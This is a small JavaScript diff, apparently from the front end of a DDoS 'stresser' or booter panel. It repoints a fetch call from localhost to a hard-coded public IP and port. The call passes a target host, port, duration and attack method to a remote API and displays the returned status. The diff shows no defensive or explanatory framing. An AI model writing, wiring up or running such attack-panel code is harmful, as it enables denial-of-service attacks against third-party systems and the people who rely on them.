@@ -57,7 +57,7 @@
             return;
         }
         
-        fetch(`http://localhost:3000/kudel?host=${host}&port=${port}&time=${time}&methods=${methods}`)
+        fetch(`http://170.64.212.98:2047/api?host=${host}&port=${port}&time=${time}&methods=${methods}`)
             .then(response => response.json())
             .then(data => {
                 document.getElementById('status').innerText = data.status || data.error;
